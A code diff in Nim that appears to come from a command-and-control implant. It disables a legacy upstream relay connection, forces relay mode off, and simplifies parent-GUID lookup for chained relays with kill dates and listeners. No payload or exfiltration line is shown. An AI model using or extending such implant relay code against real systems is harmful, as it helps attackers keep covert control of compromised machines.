@@ -91,18 +91,13 @@ proc getParentRelayServerGuid(): string =
 
 # Helper function to extract parent GUID from relay server registration
 proc extractParentGuidFromRelayConnection(): string =
-    # When connected to relay server, we should get the relay server's GUID
-    # For now, we'll use a heuristic to extract it from the connection
-    if upstreamRelay.isConnected:
-        # Try to get it from stored relay server ID or connection info
-        # This should be populated during relay registration
-        if g_parentRelayServerGuid != "":
-            return g_parentRelayServerGuid
-        else:
-            when defined debug:
-                echo "[DEBUG] 🔗 Chain Info: Parent GUID not stored, needs relay server discovery"
-            return ""
-    return ""
+    # HTTP relay system: parent GUID is stored during registration
+    if g_parentRelayServerGuid != "":
+        return g_parentRelayServerGuid
+    else:
+        when defined debug:
+            echo "[DEBUG] 🔗 Chain Info: Parent GUID not stored"
+        return ""
 
 # Speed optimization constants - CLIENT-SIDE CONFIGURATION
 when defined(FAST_MODE):
@@ -345,6 +340,8 @@ proc getAdaptiveTimeout*(): int =
         if result != adaptiveTimeout:
             echo "[DEBUG] 🛡️  TIMEOUT SAFETY BOUND: Requested " & $adaptiveTimeout & "ms, capped to " & $result & "ms"
 
+# Legacy relay connection function - commented out for HTTP relay system
+#[
 # Connect to upstream relay
 proc connectToUpstreamRelay(host: string, port: int): string =
     when defined debug:
@@ -474,7 +471,9 @@ proc connectToUpstreamRelay(host: string, port: int): string =
                 return "Connected to upstream relay but failed to register: " & host & ":" & $port
     except Exception as e:
         return "Error connecting to upstream relay: " & e.msg
+]#
 
+# Legacy relay command processing - not used in HTTP relay system
 # processRelayCommand is now imported from modules/relay/relay_commands
 
 # Safe encryption key management to prevent desync cascade
@@ -561,8 +560,9 @@ proc httpHandler() {.async.} =
     listener.killDate = CONFIG.getOrDefault("killDate", "")
     
     # CRITICAL FIX: Check relay mode first before determining initialization strategy
-    # Use isConnectedToRelay from relay_commands (the one that's actively updated)
-    let inRelayMode = relay_commands.isConnectedToRelay
+    # HTTP relay system: check if RELAY_CHAIN is defined
+    # Legacy: let inRelayMode = relay_commands.isConnectedToRelay
+    let inRelayMode = false  # Disabled legacy relay system
     
     when defined debug:
         echo "[DEBUG] 🌐 HTTP Handler: Relay mode status: " & $inRelayMode
